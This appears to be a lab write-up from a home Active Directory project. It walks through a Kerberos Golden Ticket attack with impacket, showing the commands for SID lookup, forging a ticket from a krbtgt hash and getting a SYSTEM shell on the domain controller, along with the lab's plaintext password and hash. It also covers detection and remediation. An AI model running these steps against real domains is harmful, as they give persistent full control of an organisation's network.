# Golden Ticket

## Theory
A Golden Ticket is a forged Kerberos TGT (Ticket Granting Ticket) created
using the krbtgt account's NT hash. Since every TGT in the domain is
encrypted with this hash, an attacker who obtains it can forge a valid
ticket for any account — without any authentication against the DC.
See [`docs/protocols/kerberos.md`](../../docs/protocols/kerberos.md)

## Prerequisites
- krbtgt NT hash (obtained via DCSync →
  see [`attacks/06-domain-dominance/dcsync.md`](../06-domain-dominance/dcsync.md))
- Domain SID
- Domain name
- Tools: `impacket-lookupsid`, `impacket-ticketer`, `impacket-psexec`

## Practical steps

### 1. Retrieve the domain SID
```
impacket-lookupsid bob.local/administrator:'MAMA1papa2@22'@192.168.10.7 | head -5
```
![Domain SID retrieval](../../screenshots/03-kerberos-attacks/01-lookupsid.png)

**Result:**
[*] Domain SID is: S-1-5-21-855706183-3004611232-3925024008


### 2. Add DNS resolution on Kali
Kerberos requires hostname resolution — add the DC to /etc/hosts:
```bash
echo "192.168.10.7 ADDC01.bob.local" | sudo tee -a /etc/hosts
echo "192.168.10.7 bob.local" | sudo tee -a /etc/hosts
```

### 3. Synchronize clock with the DC
Kerberos rejects tickets if the clock skew between attacker and DC
exceeds 5 minutes:
```bash
sudo ntpdate 192.168.10.7
```

### 4. Forge the Golden Ticket
```bash
impacket-ticketer \
  -nthash d25b2d64b57f0355c5400e6698289455 \
  -domain-sid S-1-5-21-855706183-3004611232-3925024008 \
  -domain bob.local \
  Administrator
```
![Golden Ticket forged](../../screenshots/03-kerberos-attacks/03-ticketer.png)

**Result:** ticket saved as `Administrator.ccache` in the current directory.

### 5. Load the ticket into the current session
```bash
export KRB5CCNAME=~/ad-project/Administrator.ccache
```

### 6. Use the ticket to get a SYSTEM shell on the DC
```bash
impacket-psexec -k -no-pass bob.local/Administrator@ADDC01.bob.local
```
![SYSTEM shell obtained via Golden Ticket](../../screenshots/03-kerberos-attacks/04-psexec-shell.png)
**Result:**



SYSTEM shell obtained on the DC.

## Result
Full SYSTEM-level access on the Domain Controller obtained using a
forged Kerberos ticket — no password used, no authentication against
the DC. Access persists even if the Administrator password is changed,
as long as the krbtgt hash remains the same.

## Why this is critical
- The Golden Ticket works even after all user passwords are reset
- It bypasses normal authentication logging (no AS-REQ generated)
- Tickets can be forged with a validity of up to 10 years
- The only remediation is rotating the krbtgt password **twice**

## Detection & remediation
- **Detection**: Look for TGTs with abnormally long lifetimes in
  Event ID 4769; absence of a prior AS-REQ for an authenticated
  session is also suspicious
- **Remediation**: Rotate krbtgt password twice (password history
  means one rotation is not enough); monitor for accounts
  authenticating without a prior AS-REQ

## References
- MITRE ATT&CK T1558.001 — Golden Ticket
- https://www.thehacker.recipes/ad/movement/kerberos/forged-tickets/golden
- https://book.hacktricks.xyz/windows-hardening/active-directory-methodology/golden-ticket

